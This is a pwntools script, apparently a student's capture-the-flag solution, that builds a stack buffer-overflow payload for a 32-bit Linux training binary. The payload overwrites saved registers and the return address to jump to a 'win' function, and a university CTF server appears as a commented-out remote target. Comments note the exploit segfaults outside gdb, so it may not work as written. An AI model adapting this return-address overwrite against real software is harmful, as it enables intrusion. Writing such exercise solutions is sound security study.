#!/bin/python3
from pwn import *

context.terminal = ['tmux', "new-window"]
context.arch = 'i386'
context.os = 'linux'


#eip
#ebp
#edi
#ebx
#ecx
elf = ELF("./bin")

bufferBss =  0x804a060
bufferMain = 0xffffcbf0
pEcx = 0xffffcc60 #volatil pode ser esta a fonte de problemas eu diria
# pEcx = bufferBss + 68
# pEbx = 0xf7f9be14
# pEdi = 0xf7ffcb60
pEbx = 0x1 # NÃO SÃO PRECISOS
pEdi = 0x1 # NÃO SÃO PRECISOS


# pEbp = bufferBss + 60
pEbp = 0x1 # NÃO SÃO PRECISOS

win =  0x80485d7

eip = 0xffffcc5c

offset = eip - bufferMain #108

# offset = 0x80483d0

# toEcx = 0x58 - 0xd
toEcx = 0x4c
mainReturn = 0xf7d8ad43

pEcx = bufferBss + 0x508 #////////////// some how i need to change the stack address to the buffer in onrder to know where the stack is but when i do that i get a seg fault but in gdb without that i can get the flag

ebpToEip = 0x3c - 0x28 - 0x4

payload = b"A"*toEcx + p32(pEcx) + p32(pEbx) + p32(pEdi) + p32(pEbp) + b"b"*ebpToEip + p32(win) + p32(mainReturn)

# P = gdb.debug("./bin", gdbscript="""
#     set disable-randomization on
#     continue
# """)
P = process("./bin")
#P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9997)
# time.sleep(10)
print(p32(win))
# P.sendline(p32(0x80486f0) + p32(bufferBss+16) + p32(bufferBss + 12) + p32(0xf7f9be14) + p32(0x5353454c) + b"A" * 20 + p32(0xf7f9be14) + p32(bufferBss + 8) + p32(bufferBss + 4) + p32(bufferBss) + p32(mainReturn) + p32(win + 33))
P.sendline(b"A"*0x504 + p32(win) + p32(mainReturn))
P.sendline(payload)
print(P.recvall().decode("utf-8"))
# P.interactive()